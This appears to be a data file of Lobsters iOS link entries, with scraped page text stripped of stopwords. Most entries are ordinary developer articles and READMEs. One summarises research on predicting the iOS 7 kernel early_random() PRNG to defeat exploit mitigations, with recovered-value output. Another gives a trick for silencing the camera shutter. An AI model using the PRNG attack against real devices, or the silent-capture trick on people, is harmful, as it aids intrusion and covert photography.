517,Lobsters,ios,Apple iOS,Lobsters: An open source Lobste.rs app for iOS 7+,https://github.com/JamesS237/lobsters-ios,lobster open source lobster app io,lobster io lobster screenshots building please note rubymotion ruby bundler xcode cocoapods issue open issue contributing roadmap licence lobster licence jcs jcsorg,lobster io lobster technologyfocused linkaggregation site created july joshua stein similar hacker news reddit slashdot borrows idea also attempting fixing problem specific site app nonoffical io app build rubymotion browse enjoy lobster whilst providing native io feel though strictly forbidden license please submit unmodified trivially modified version application app store screenshots story list view story view building please note licenced rubymotion installation required build project available download app store dependency rubymotion ruby bundler xcode newer xcode cocoapods fetched bundler build lobstersios firstly clone repository locally change directory grab ruby gem bundle install grab cocoapods rake pod install run rake simulator rake device device issue feedback bug report comment open issue contributing see contributingmd roadmap unit testing ci make comment viewing nicer offline cache idea open issue licence mit license mit copyright c james spencer permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software lobster licence copyright c joshua stein jcs jcsorg redistribution use source binary form without modification permitted provided following condition met redistribution source code must retain copyright notice list condition following disclaimer redistribution binary form must reproduce copyright notice list condition following disclaimer documentation andor material provided distribution name author may used endorse promote product derived software without specific prior written permission software provided author express implied warranty including limited implied warranty merchantability fitness particular purpose disclaimed event shall author liable direct indirect incidental special exemplary consequential damage including limited procurement substitute good service loss use data profit business interruption however caused theory liability whether contract strict liability tort including negligence otherwise arising way use software even advised possibility damage
518,Lobsters,ios,Apple iOS,Announcing Telerik UI for iOS,http://blogs.telerik.com/blogs/14-06-25/announcing-telerik-ui-for-ios,announcing telerik ui io,ui io ui android core product series ax annotation trackball pan zoom animation easy data population flexible api view different selection mode event support localization flexible api smart syncing algorithm local data persistence sqlite integrated telerik backend service support resource online documentation video tutorial demo apps github appstore support update special price ui io suite ui io pricing page platform pricing page supported io version trial v licensed version grab bit ui io download page next step blog google twitter,week really exciting telerik native mobile story ui io ui android officially released manufacturing rtm article look ui io really add missing ui piece io application core product ui io suite native control fill gap uikit framework component aim address various ui data related scenario make native development easy pleasant first official version ui io offer chart calendar appfeedback datasync beta let look component chart chart intuitive easy use data visualization control business consumer ipad iphone apps control delivers elegant user experience polished ui sleek animation performance quick rundown chart feature series depending scenario choose one supported series column bar line line area spline spline area pie donut bubble scatter stack series bar column area candlestick ohlc financial indicator ax supported ax numeric categoric datetime multiple ax support negative value annotation make note trend observation anywhere plot thanks new annotation feature annotation explanatory image text anchored single point coordinate chart surface available annotation type band line cross line balloon layerview trackball —Çhis feature allows even greater precision reading chart data display small popup containing information point trackball line cross visualization series object pan zoom feature come especially handy small device viewing data may allow understand well case chart io allows zoom data pinch gesture get chunk data viewable area pan chart order get portion data view animation chart ship collection prebuilt core animation uikit dynamic based animation animate data point individually modify animation velocity easing control leverage uikit dynamic engine introduced latest io help easily create unique inspiring user interface easy data population choose three easy way populate io chart data depending coding style use delegate configure data source consuming collection data point nsmutablearray array nsmutablearray new int array addobject tkchartdatapoint alloc initwithx chart addseries tkchartlineseries alloc initwithitems array configure data source consuming property model object flexible api thanks control flexible api freedom style according specification calendar calendar control new addition io suite highly customizable easy use developer enduser perspective view present date week month year view different selection mode control cover various selection scenario enabling user select single date multiple date range date event support support event allows add custom event get event device using eventkit top event beautifully displayed date cell ipad shown show event glyph also event title text localization support different culture critical mobile apps telerik io calendar either inherit default device culture use custom one provided developer flexible api date cell calendar component based uiview thanks freedom style separate date cell according specification appfeedback appfeedback control implemented app gain invaluable insight user experience sending feedback user side easy simply shake device navigate feedback option control take screenshot automatically prompt user point problematic area add comment control seamlessly integrated telerik platform appfeedback module enabling developer easily monitor track user feedback one place end brings easy communication endusers directly within application post feedback appfeedback forum ui io feedback portal datasync data sync control powerful solution synchronizing application data across device cloud smart syncing algorithm ensure change made data offline synced cloud app connected smart syncing algorithm synchronization algorithm datasync component allows developer determine data synced wifi connection also specify whether cloud client data prevail conflict appears may decide use custom logic conflict resolution handling method tkdatasyncdelegate local data persistence sqlite datasync component embeds lightweight orm allows easily transform data class table sqlite thus saving lot time create appropriate schema sqlite integrated telerik backend service cloud side datasync framework backed telerik baa completing data user story start finish support resource ui io come comprehensive easy follow documentation case would like know particular feature detail documentation installed suite integrates xcode meaning hand reach time also provide online documentation preference order make comfortable read documentation style resembles apple doc expect u cover suite video tutorial make learning curve even flat demo apps ship demo application xcode project showcasing product feature source code available directly paste snippet project find application installation ui io github another demo app available appstore advanced demo application demonstrates component work currently ipad version iphone follow soon code application also available future version suite download telerik ui app appstore support telerik established standard firstclass support developer software market ui io different get access support channel even trial period professional developer license provides response time enquires year trial license provides response time day update understand dynamic development update strive produce three major release per year smaller update monthly basis always get freshest feature special price ui io suite launched ui io limited time introductory price buying product give one year product update plus dedicated support response time find offer ui io pricing page get ui io licensed version part professional business platform subscription listed platform pricing page supported io version ui io good adoption rate latest io version always high apple brings improvement benefit switch next io version get popular among endusers trial v licensed version trial version fully functional meaning provides feature find licensed version difference trial version display trial message grab bit download ui io ui io download page next step continue introducing feature ui io suite make productive successful end want make sure feature product solve real problem feel free leave comment forum submit feature request feedback portal say hi blog google twitter
521,Lobsters,ios,Apple iOS,Swifting Around,http://weheartswift.com,swifting around,read,wwdc apple annual worldwide developer conference great chance developer around world meet best engineer apple get latest insight favorite product latest technology great event learn new thing valuable workshop handson lab software session thematic meeting many special
522,Lobsters,ios,Apple iOS,Unit Testing in Swift,http://bendyworks.com/unit-testing-in-swift/,unit testing swift,unit testing swift simple test using common subject xctest√¢ handle multiple test one testcase conclusion,unit testing swift swift rage last four day definitely livened programming chat room quite bit cautious optimism betsy brad delved xcode beta curious state testing swift purpose article cover basic unit testing xctestframework simple test get thing rolling wrote plain old swift object represent firewood class firewood var charred bool init println initializing firewood charred false func burn charred true see simple initializer and√¢ one√¢ function burn firewood write simple test assert burning firewood char import xctest class simplefirewoodtests xctestcase func testburningactuallychars let firewood firewood firewoodburn assert firewoodcharred charred burning using common subject multiple test using setup object test use rspec parlance want repeat initialization inside test dry trial error involving opaque runtime error learned answer definitely involve overriding init method xctestcase subclass go hic sunt dracones instead want declare initialize instance variable let var shown class simpledryfirewoodtests xctestcase let firewood firewood func testburningactuallychars firewoodburn assert firewoodcharred charred burning may seem little counterintuitive might ask happens firewood object subsequent test block mutate one take u next section xctest√¢ handle multiple test one testcase xctest avoids using dirty object previous test instantiating brandnew xctestcase object test function three√¢ test xctestcase subclass framework instantiate three√¢ object whole xctestcase subclass work test suite even start observe class firewoodtests xctestcase let firewood firewood func println testing new object test assert firewoodcharred charred burning firewoodburn func println testing new object test assert firewoodcharred charred burning firewoodburn func testburningactuallychars firewoodburn assert firewoodcharred charred burning since subject print time init called see happens relation everything else test run beginning log output initializing firewood initializing firewood initializing firewood test suite test started note three firewood object created presumably three different firewoodtests object test suite even begin output conclusion hope article help avoid misstep took seems unit testing swift implemented well despite dearth documentation anyone else adventure share testing swift
523,Lobsters,ios,Apple iOS,My First Hello World with Apple's Swift and Telerik UI for iOS,http://blogs.telerik.com/blogs/14-06-03/my-first-hello-world-with-apples-swift-and-telerik-ui-for-ios,first hello world apple swift telerik ui io,swift swift parallel scripting language developer account itunes online reference io developer library online documentation git repository,heard big news wwdc apple new modern language named swift please note mistaken existing swift parallel scripting language telerik eager try new language write code first impression positive fact registered apple developer start experimenting swift language right download xcode beta developer account language reference also available itunes free read online reference another good resource found io developer library marked prerelease let get started first create new single view application forget specify swift language specifying project name wizard finish project structure written objectivec difference header file missing file replaced swift file quite easy use third party framework swift add desired framework form target setting case use telerikuiframework nt know add follow step described online documentation one step order mix objectivec swift code add least one objectivec file instruct xcode create socalled bridging header open new file dialog choose objectivec file name file bridgem save asked configure bridging header file click yes h file created following naming convention yourprojectnamebridgingheader include following line file import uikituikith import telerikuitelerikuih way telerik ui class available use swift file start writing code open viewcontrollerswift file add following line viewdidload method var chart tkchart frame cgrectinset selfviewbounds selfviewaddsubview chart everything similar objectivec use cocoa touch framework apis named parameter also fewer brace semicolon order show chart add data following line create simple sine wave var item tkchartdatapoint x var sin mpi cdouble x itemsappend tkchartdatapoint x cdouble x x see even constant like mpi available interesting change two dot cycle three dot way include also final value iterating create series order add data chart var series tkchartsplineseries item item seriesyaxis tkchartnumericaxis minimum var xaxis tkchartnumericaxis xaxismajortickinterval seriesxaxis xaxis chartaddseries series result full sample code available git repository download telerik ui io using swift really easy intuitive
524,Lobsters,ios,Apple iOS,Rust Creator Graydon Hoare's Thoughts On Swift,http://graydon2.dreamwidth.org/5785.html,rust creator graydon hoare thought swift,swift rust nerd logistics feature peculiarity,today apple introduced new language called swift along pretty hot livecoding environment neat area expert going ignore certain livecoding nerd discus elsewhereswiftthelanguage finished quickly lightly reading manual suggest take commentary grain salt point thing might interest rushed reader nt see obvious bit quite obviously someone recently working space several rust nerd also busy examining commentinglogisticsit llvmbased compiles native code like many recent language probably run quite fast target many device natively including clientside memory use latency kinda still mattersit appears objective c object model interop hard design constraint limit stuff safely doit appears proprietary though hope sake true seems borrow quite extensively c nt know say politely modestly rust flattering true course biased also language pluralist since rust major cobblingtogether thing liked language ml c c lisp ruby etc nt mean claiming sort originality nice see idea liked trying promote spreading elsewhere love see post design team talking process liked disliked language tried borrow adapt reinvent convergent evolution happens lot language often funny effect featuresno explicit pointer see inout relies valuereference type dichotomy like c halfway step regaining performance lose moving allheap system like java note java toying value type without cognitive design load explicit pointer look like biggest difference rust also mean ca nt easily say take pointer middle another structure array sad reasonable compromiseobviously keeping real mechanism reasoning ownership reference type arc pointer shared heap weak partner period region uniqueness associated performance also cognitive load rust presentsingle inheritance class explicit overriding property plus multiple inheritance interface protocol norm day c ish thought protocol appear default method carry class reference type unlike structs value typesprotocols get play double duty either concrete type case denote reference type acquire supporting type type constraint type parameter generic code delightful convenience rust stumbled designing trait system glad see language picking sure precedent elsewhereposthoc adaptation type unrelated protocol using extension sure coherence rule ca nt find themlambdas appear use similar rubyish block form right trailing argument form rust used year two ago moved away kinda liked also cute evenshorter form using numbered variable like clojure reader macronice normal functionallanguagey algebraic type tuples sum type latter introduced enum rust pattern matching destructuring binding expect nearly identical rust except obviously without wrinkle trying bind explicit pointer also avoided syntactic ambiguity wound rust pattern language much dismay get disambiguated name resolution later local type inference tidied numeric type nicer literal implicit coercion yayscriptlanguagey goish support dictionary literal minor populara basic module system without glob grouped import renaming visibility control reexporting supported though attributesno macro system far tellnonpervasivenull thank goodness instead copy optiontype nullable sugar show c recent facebook hack language including quite bit sugar option chaining forcing binding greatlet var differentiate immutable mutable bindingspeculiaritiesarrays strange copyonextension semantics think always heap maybe string also seemingly cow heap think unclearunclear allowed implement iterator protocol yourselfvisually confusable operator exclusive inclusive rangesparameters inout argument require seemingly invincible unary operator funny inout keyword also objc refuse die rust grew first class region pointer lifetime system sort thing also parameter mode asymmetry argumentpassing mode real pointer eventually became much bear guess swift betting wo nt badseemingly expression language guess macro system discussion error handling aside algebraic type option type mysterious occasional reference runtime error sure isolation recovery system one word unwind nt occur manualan approach named parameter look suspiciously like olabl variant ocaml sure much use likely get checked arithmetic default hex floating point literal yay overall mostly agree bryan osullivan tweet started working rust lot motivation pain losing nice mlisms enjoyed hobby hacking came time work c pay actually tried pull lot stuff algebraic type pattern matching option annotationlight typing failed project well sank weightit remarkable year seen shift considered normal newlanguage tech f shipping several platform whether ever actually surface scala considered employable skill lambda local type inference least algebraic type pattern matching rust actually exists one rely similar comfort apple ecosystem delightful
525,Lobsters,ios,Apple iOS,The Swift Programming Language,https://itunes.apple.com/gb/book/swift-programming-language/id881256329?mt=11,swift programming language,,book serf masterclass clarity approachabilitythe language explained genuinely relevant example topic hand artificial example mean glance source code example quickly flip back motivation explanation greatest strength bookthe tone book highly approachable tutor practical advice language referenced always add color contrast approach used never unfair superior tonethis book sit well amongst existing pillar c programming language java programming language c programming language computer science cannon reader able see influence prior work
526,Lobsters,ios,Apple iOS,Why mobile developers should care about deep linking,http://developer.telerik.com/products/why-developers-should-care-about-deep-linking/,mobile developer care deep linking,prepage rank phase deep linking type apps benefit deep linking practical benefit deep linking card ui becoming hot mobile deep linking resource apple resource android resource general resource party solution twitter google adding deep linking google post shared android app facebook learn ui io feature,user spending hour minute per day mobile device recently seen statistic revealing native app usage smartphones increasing expense mobile web industry mobile sale steadily increasing even eating web sale certain retailer hard believe huge fast growing native mobile apps market still prepage rank phase mobile developer marketer business owner ecosystem collect advanced performance data user discover content service efficiently deep linking help deep linking mobile deep linking methodology allows mobile apps communicate mobile web mobile apps via clickable link directing user specific landing page screen inside app instead sending back mobile site store deep linking help reduce conversion friction shortening user path piece content product promo interested type apps benefit deep linking apps shopping travel hotel booking music news ability send user specific product offer promo page tremendous effect conversion rate ultimately revenue deep linking enabled user navigated directly certain hotel booking page seen advertisement instead app home page last year facebook announced deep linking ad format letting user come back familiar apps ad feed image source http another scenario might app post facebook behalf user deep link post user friend interact post directed inside app instead app store fitness apps another type benefit deep linking example let imagine app track run may run route view detail run one app let view google map detailed mapping info run could logged another fitness app designed keep track day deep linking work user app already installed right true deep linking benefit preinstalled new user solution example tapstream carry forward saved request user app installed heshe sent app store upon opening app installation directly taken deep linked page screen eliminating search requested content even deep linking used reengagement mechanism bring user back inside app enormous potential drive conversion roi practical benefit deep linking big use case deep linking email campaign existing user likely app already installed basically click away given promo exciting offer another use case social medium campaign share button help deep link able send user dedicated content overcoming limitation one generic starting point user app journey huge impact profitability mobile revenue deep linking get much cleaner read analytics user dropped optimal experience device therefore deflating bounce rate revealing accurate conversion rate mobile web say marketing director curated online menswear shop recently reported share mobile sale twitter announced month ago twitter card support deep linking allowing user download app installed navigate inapp content app installed device unfamiliar card ui previous blog post talked card ui becoming hot mobile brand google pinterest facebook twitter use deep linking resource established standard deep linking native platform guideline community effort establish standard also number party vendor offering advanced solution deep link analytics deferred deep link retargeting framework list useful resource developer interested learning deep linking apple resource android resource general resource party solution twitter google adding deep linking google post shared android app facebook already using deep linking mobile apps share thought comment section tried telerik ui io native control bridge missing functionality uikit framework learn ui io feature
527,Lobsters,ios,Apple iOS,Silencing the iOS shutter sound,https://stackoverflow.com/questions/23758875/capture-image-via-capturestillimageasynchronouslyfromconnection-with-no-shutter,silencing io shutter sound,method http method grab frame video stream method,method sure work try playing blank audio file right send capture event play clip add audio toolbox framework include audiotoolboxaudiotoolboxh play audio file like immediately take picture nsstring path nsbundle mainbundle pathforresource blank oftype wav systemsoundid soundid nsurl filepath nsurl fileurlwithpath path isdirectory audioservicescreatesystemsoundid cfurlref filepath soundid audioservicesplaysystemsound soundid blank audio file need http method also alternative nt work long nt need good resolution grab frame video stream thus avoiding picture sound altogether method another way would take screenshot application way uigraphicsbeginimagecontext selfwindowboundssize selfwindowlayer renderincontext uigraphicsgetcurrentcontext uiimage image uigraphicsgetimagefromcurrentimagecontext uigraphicsendimagecontext nsdata data uiimagepngrepresentation image data writetofile foopng atomically yes wanting fill whole screen preview video stream screenshot look good avcapturesession capturesession yourcapturesession avcapturevideopreviewlayer previewlayer avcapturevideopreviewlayer layerwithsession capturesession uiview aview theviewyouwantthelayerin previewlayerframe aviewbounds assume want preview layer fill view aviewlayer addsublayer previewlayer
528,Lobsters,ios,Apple iOS,vpdn/MMLayershots ¬∑ GitHub,https://github.com/vpdn/MMLayershots,vpdnmmlayershots github,mmlayershots layershots take io app convert view hierarchy layered photoshop file screenshots steroid increase experimentation koen present framework http examplesframerjscom google vpdn iphone simulator rdar issue issue issue issue,mmlayershots layershots take io app convert view hierarchy layered photoshop file screenshots steroid iterating design existing app tedious oftentimes original design asset nt available anymore become outdated taking flattened screenshot png current app give date view slicing part ui reconstructing occluded area time consuming layershots eas pain little whenever take screenshot app generates photoshop psd file entire app view hierarchy take psd file dump psd editing tool choice photoshop pixelmator acorn yes even gimp adjust layer like static usecases visual change often iterated much faster graphical tool photoshop nt require compilerunnavigate cycle ultimate goal increase experimentation would icon look like another color would app look like replaced chat icon animation people make mistake thinking design look like people think veneer designer handed box told make look good think design look like feel like design work steve job framerjs one best tool currently quickly prototype animation interaction take psd load framerjs bring ui life line javascript info watch koen present framework make sure check example http examplesframerjscom google overviewframer website designer preamble designer nt write code next section might look like message written et parent guide home rest assured pretty simple plug layershots app whoever developing app get integrated line code question feel free ping twitter vpdn glad help sample project sample project link sfpsdwriter library via git submodule run sample first clone project git clone http githubcomvpdnmmlayershotsgit run following command initialize submodule git submodule update init recursive use layershots preferred way install via cocoapods add podfile pod mmlayershots application delegate initialize mmlayershots shared instance bool application uiapplication application didfinishlaunchingwithoptions nsdictionary launchoptions mmlayershots sharedinstance setdelegate self return yes mandatory delegate method tell layershots screenshot taken mmlayershotscreatepolicy shouldcreatelayershotforscreen uiscreen screen return mmlayershotscreateonuserrequestpolicy return mmlayershotscreateneverpolicy disable layershots mmlayershotscreateonuserrequestpolicy pas request user popup mmlayershotscreatenowpolicy trigger generation psd immediately two optional delegate method one called willcreatelayershotforscreen one didcreatelayershotforscreen data psd generated use latter save data file present open option user void willcreatelayershotforscreen uiscreen screen nslog creating psd could hide away stuff user info nt want psd void didcreatelayershotforscreen uiscreen screen data nsdata data nsarray path nssearchpathfordirectoriesindomains nsdocumentdirectory nsuserdomainmask yes nsstring documentsdirectory path firstobject nsstring filepath documentsdirectory stringbyappendingpathcomponent layershotspsd data writetofile filepath atomically nslog saving psd filepath iphone simulator iphone simulator nt trigger notification screenshot saved rdar work around use key command note generated psd file currently bigger need nt bound calculation yet every layer rendered full screen issue layer currently grouped layer named layer issue rendered psd pixel perfect might glitch test suite upcoming issue currently layershots support portrait mode issue list outstanding missing feature check github issue page would awesome could help thanks
530,Lobsters,ios,Apple iOS,Creating a Planet Lisp mobile app in 15 minutes with mocl,https://wukix.com/pl-screencast,creating planet lisp mobile app minute mocl,screencast creating planet lisp mobile app minute mocl,screencast creating planet lisp mobile app minute mocl
532,Lobsters,ios,Apple iOS,Pop: an extensible animation engine for iOS and OS X by Facebook,https://github.com/facebook/pop,pop extensible animation engine io o x facebook,paper installation cocoapods framework manual note note static library manual usage objectivec swift start stop update objectivec swift objectivec swift objectivec swift type objectivec swift objectivec swift objectivec swift property objectivec swift objectivec swift debugging objectivec swift objectivec swift testing scenekit weakly linked framework xcode release note resource contributing license,pop extensible animation engine io tvos o x addition basic static animation support spring decay dynamic animation making useful building realistic physicsbased interaction api allows quick integration existing objectivec swift codebases enables animation property object mature welltested framework drive animation transition paper installation pop available cocoapods add following project podfile bug first fixed master made available via designated release tend live bleeding edge use pop master following podfile entry pod pop git http githubcomfacebookpopgit framework manual adding project project adding popembedded framework embedded binary section general tab app target set pop second also enables import pop syntax header module note awkward limitation xcode embedded binary must share name module must framework extension mean see three popframeworks adding embedded binary one o x one tvos one io need sure add right one appear identically list note list populated order target verify correct one chosen checking path next framework listed format configuration platform eg debugiphoneos note method currently play nicely workspace since target depend embed product target project work popxcodeproj added subproject current target project otherwise need manually set build ordering scheme copy product static library manual alternatively add project workspace adopt provided configuration file manually copy file pop subdirectory project installing manually ensure c standard library also linked including lc project linker flag usage pop adopts core animation explicit animation programming model use including following import objectivec using embedded framework swift start stop update start animation add object wish animate objectivec popspringanimation anim popspringanimation animation layer popaddanimation anim forkey mykey swift let anim popspringanimation layerpopadd anim forkey mykey stop animation remove object referencing key specified start objectivec layer popremoveanimationforkey mykey swift layerpopremoveanimation forkey mykey key also used query existence animation updating tovalue running animation provide seamless way change course objectivec anim layer popanimationforkey mykey anim update value new destination animtovalue else create start new animation swift let anim layerpopanimation forkey mykey popspringanimation update value new destination animtovalue else create start new animation layer used example pop interface implemented category addition nsobject nsobject subclass animated type four concrete animation type spring decay basic custom spring animation used give object delightful bounce example use spring animation animate layer bound current value objectivec popspringanimation anim popspringanimation animationwithpropertynamed kpoplayerbounds animtovalue nsvalue valuewithcgrect cgrectmake layer popaddanimation anim forkey size swift let anim popspringanimation propertynamed kpoplayerbounds animtovalue nsvalue cgrect cgrect x width height layerpopadd anim forkey size decay animation used gradually slow object halt example decay layer positionx current value velocity per second objectivec popdecayanimation anim popdecayanimation animationwithpropertynamed kpoplayerpositionx animvelocity layer popaddanimation anim forkey slide swift let anim popdecayanimation propertynamed kpoplayerpositionx animvelocity layerpopadd anim forkey slide basic animation used interpolate value specified time period use easein easeout animation animate view alpha default duration objectivec popbasicanimation anim popbasicanimation animationwithpropertynamed kpopviewalpha animtimingfunction camediatimingfunction functionwithname kcamediatimingfunctioneaseineaseout animfromvalue animtovalue view popaddanimation anim forkey fade swift let anim popbasicanimation propertynamed kpopviewalpha animtimingfunction camediatimingfunction name kcamediatimingfunctioneaseineaseout animfromvalue animtovalue viewpopadd anim forkey fade popcustomanimation make creating custom animation transition easier handling cadisplaylink associated timestep management see header detail property property animated specified popanimatableproperty class example create spring animation explicitly set animatable property corresponding calayer bound objectivec popspringanimation anim popspringanimation animation animproperty popanimatableproperty propertywithname kpoplayerbounds swift let anim popspringanimation let property popanimatablepropertyproperty withname kpoplayerbounds popanimatableproperty animproperty property framework provides many common layer view animatable property box animate custom property creating new instance class example declare custom volume property objectivec prop popanimatableproperty propertywithname comfooradiovolume initializer popmutableanimatableproperty prop read value propreadblock id obj cgfloat value value obj volume write value propwriteblock id obj const cgfloat value obj setvolume value dynamic threshold propthreshold animproperty prop swift let prop popanimatablepropertyproperty withname comfooradiovolume initializer prop guard let prop prop else return read value propreadblock obj value guard let obj obj volumeable let value value else return value objvolume write value propwriteblock obj value guard var obj obj volumeable let value value else return objvolume value dynamic threshold propthreshold popanimatableproperty animproperty prop complete listing provided animatable property well information declaring custom property see popanimatablepropertyh debugging tip debugging pop obeys simulator toggle slow animation setting try enabling slow animation easily observe interaction consider naming animation allow easily identify referencing either via logging debugger objectivec animname springopen swift animation come associated tracer tracer allows record animationrelated event fast efficient manner allowing query analyze animation completion example start tracer configures log event animation completion objectivec popanimationtracer tracer animtracer tracershouldlogandresetoncompletion yes tracer start swift let tracer animtracer tracershouldlogandresetoncompletion true tracerstart see popanimationtracerh detail testing pop extensive unit test coverage install test dependency navigate root pop directory type assuming cocoapods installed include necessary ocmock dependency unit test target scenekit due scenekit requiring io o x pop scenekit extension nt provided box unfortunately weakly linked framework used due issue mentioned xcode release note remedy easily optin use scenekit simply add preprocessor macro section xcode project resource collection link external resource may prove valuable contributing see contributing file help license pop released bsd license see license file detail
533,Lobsters,ios,Apple iOS,Building Paper,https://www.youtube.com/playlist?list=PLb0IAmt7-GS2sh8saWW4z8x2vo7puwgnR,building paper,,
534,Lobsters,ios,Apple iOS,Is cards UI the future of mobile?,http://blogs.telerik.com/blogs/14-04-15/is-cards-ui-the-future-of-mobile,card ui future mobile,card hot recently ideal responsive design going responsive google play individual unit quickly consumable content serve party data twitter card advertising format blog post think card,card part everyday routine exchange business card holiday card play card u collect card participate actively digital experience well many big brand using heavily already google embracing cardsstyle interface across mobile web mobile search google google google map google play pinterest facebook twitter three social medium giant also moved card card hot recently think card rectangle html box module actually nothing new card modular piece content enable embedding rich medium fostering interactivity make card design unit choice many publisher extremely wellsuited mobile environment easy scan consume glance offer great capability user manipulation swipe stack flip pan fold group sort etc ideal responsive design one biggest benefit card bring design various device scalability different state compact normal expanded rendered variable position accommodate vertical horizontal stacking card economical solution designing building multiple device different screen size presentation going responsive google play google play team discus depth card helped achieve design scale across device web individual unit quickly consumable content mobile user attention span comparable young child matter using device home work front tv waiting queue delivering consistent experience card individual unit quickly consumable content leaving user satisfied end rather frustrated interrupted midway serve party data card already big impact mobile development serve data experience internal api design feel natural mobile also party api markup twitter example introduced twitter card advertising format going one step using card design container platform serving party content blog post discus detail power card deliver party information performance coming api think card plan using design pattern next mobile app see viable solution challenge responsive design project share feedback comment
535,Lobsters,ios,Apple iOS,Chromium Issue 355541 - GUID-like string added to `navigator.userAgent` on iOS,http://code.google.com/p/chromium/issues/detail?id=355541,chromium issue guidlike string added navigatoruseragent io,,
538,Lobsters,ios,Apple iOS,Attacking the iOS 7 early_random() PRNG,http://blog.azimuthsecurity.com/2014/03/attacking-ios-7-earlyrandom-prng.html,attacking io earlyrandom prng,mark detailed linear congruential generator slide white paper exploitation io kernel prng,back mark detailed number io kernel mitigation introduced io prevent attacker leveraging wellknown exploitation technique zone free list pointer overwrite mitigation rely entropy varying degree provided kernel therefore supported separate random number generator known earlyrandom prng generator fundamental robustness mitigation received additional improvement io unarguably interesting target deserves study initial version early random prng found io leveraged fairly simple generator derived value directly cpu tick count seed provided iboot although generator able create somewhat unpredictable value serious defect output wellcorrelated especially case successively generated value additionally seed combined higher bit output hence lower bit typically part used io device unaffected seed value thus attempt improve early random prng io apple decided leverage entirely new generator specifically io us linear congruential generator prng wellknown strength notable weakness lcg quality essentially determined choice parameter although early random prng clearly inspired glibc randomr ansi c rand alarmingly weak practice notably earlyrandom io produce unique output maximum period length sequence unique output start well size possible output space may allow attacker predict value little effort particular found unprivileged attacker even confined restrictive sandbox recover arbitrary output generator consequently bypass exploit mitigation rely early random prng finding detailed following slide white paper includes suggestion improve earlyrandom future io version mobile uname darwin darwin kernel version fri sep pdt root darwin mobile prng n v attempting recover permutation value created pipe descriptor pipe inode bruteforcing discarded bit found match computing remaining state prng output backtracking seed dumping prng output raw output value type initial seed bit stack check guard zone poisoned cookie zone factor zone nopoison cookie kernel map offset yarrow seed vm permutation value buf permutation value label exploitation io kernel prng
542,Lobsters,ios,Apple iOS,NYT Objective-C style guide,https://github.com/NYTimes/objective-c-style-guide,nyt objectivec style guide,nytimes objectivec style guide issue pull request hiring contributor introduction rfc table content dot notation syntax example spacing example conditionals error even dangerous defect example ternary operator example error handling example method example example variable example example apple doc using accessor method initializer method example variable qualifier introduced arc naming memory management rule narc example reserved use apple example llvm synthesize variable automatically let example category example example comment init dealloc literal example function function example constant example enumerated type example bitmasks example private property example image naming example booleans object pointer value example cocoa naming guideline singleton possible sometimes frequent crash import together import protocol delegate data source protocol example xcode project additional warning clang pragma feature objectivec style guide,nytimes objectivec style guide style guide outline coding convention io team new york time welcome feedback issue pull request also hiring thanks contributor introduction document apple informed style guide something mentioned probably covered great detail one style guide conforms ietf rfc particular code go recommendedshould style allowed carefully considered table content dot notation syntax dot notation recommended bracket notation getting setting property example viewbackgroundcolor uicolororangecolor uiapplicationsharedapplicationdelegate view setbackgroundcolor uicolor orangecolor uiapplication sharedapplication delegate spacing indentation must use space never indent tab sure set preference xcode method brace brace ifelseswitchwhile etc must open line statement brace must close new line example userishappy something else something else exactly one blank line method aid visual clarity organization whitespace within method may separate functionality though inclination often indicates opportunity split method several smaller method method long verbose name single line whitespace may used provide visual separation method body synthesize dynamic must declared new line implementation conditionals conditional body must use brace even conditional body could written without brace eg one line prevent error error include adding second line expecting part ifstatement another even dangerous defect happen line inside ifstatement commented next line unwittingly becomes part ifstatement addition style consistent conditionals therefore easily scannable example error return success error return success error return success ternary operator intent ternary operator increase clarity code neatness ternary evaluate single condition per expression evaluating multiple condition usually understandable statement refactored named variable example result b x c c error handling method return error parameter reference code must switch returned value must switch error variable example nserror error self trysomethingwitherror error handle error nserror error self trysomethingwitherror error error handle error apple apis write garbage value error parameter nonnull successful case switching error cause false negative subsequently crash method method signature space scope symbol space method segment example void setexampletext nsstring text image uiimage image method exceeding character represented like form new line argument example void setexampletext nsstring text image uiimage image color uicolor color alternativetext nsstring alttext variable variable named descriptively variable name clearly communicating variable pertinent information programmer need use value properly example nsstring title reasonable assume title string nsstring titlehtml indicates title may contain html need parsing display html needed programmer use variable effectively nsattributedstring titleattributedstring title already formatted display attributedstring hint value vanilla title adding could reasonable choice depending context nsdate clarification needed nsdate lastmodifieddate simply lastmodified ambiguous depending context one could reasonably assume one different type nsurl url v nsstring urlstring situation value reasonably represented different class often useful disambiguate variable name nsstring releasedatestring another example value could represented another class name help disambiguate single letter variable name recommended except simple counter variable loop asterisk indicating type pointer must attached variable name example nsstring text nsstring text nsstring text except case constant nsstring const nytconstantstring property definition used place naked instance variable whenever possible direct instance variable access avoided except initializer method init initwithcoder dealloc method within custom setter getters information see apple doc using accessor method initializer method dealloc example interface nytsection nsobject property nonatomic nsstring headline end interface nytsection nsobject nsstring headline variable qualifier come variable qualifier introduced arc qualifier strong weak unsafeunretained autoreleasing placed asterisk variable name eg nsstring weak text naming apple naming convention adhered wherever possible especially related memory management rule narc long descriptive method variable name good example uibutton settingsbutton three letter prefix eg nyt must used class name constant however may omitted core data entity name constant must camelcase word capitalized prefixed related class name clarity two letter prefix eg n reserved use apple example static const nstimeinterval nytarticleviewcontrollernavigationfadeanimationduration static const nstimeinterval fadetime property local variable must camelcase leading word lowercase instance variable must camelcase leading word lowercase must prefixed underscore consistent instance variable synthesized automatically llvm llvm synthesize variable automatically let example synthesize descriptivevariablename descriptivevariablename category category recommended concisely segment functionality named describe functionality example interface uiviewcontroller nytmediaplaying interface nsstring nsstringencodingdetection interface nytadvertisement private interface nsstring nytadditions method property added category must named app organizationspecific prefix avoids unintentionally overriding existing method reduces chance two category different library adding method name objectivec runtime specify method called latter case lead unintended effect example interface nsarray nytaccessors id nytobjectornilatindex nsuinteger index end interface nsarray nytaccessors id objectornilatindex nsuinteger index end comment needed comment used explain particular piece code something comment used must kept uptodate deleted block comment recommended code selfdocumenting possible need intermittent fewline explanation apply comment used generate documentation init dealloc dealloc method placed top implementation directly synthesize dynamic statement init method placed directly dealloc method class init method structured like instancetype init self super init call designated initializer self custom initialization return self literal nsstring nsdictionary nsarray nsnumber literal used whenever creating immutable instance object pay special care nil value passed nsarray nsdictionary literal cause crash example nsarray name brian matt chris alex steve paul nsdictionary productmanagers iphone kate ipad kamal mobile web bill nsnumber 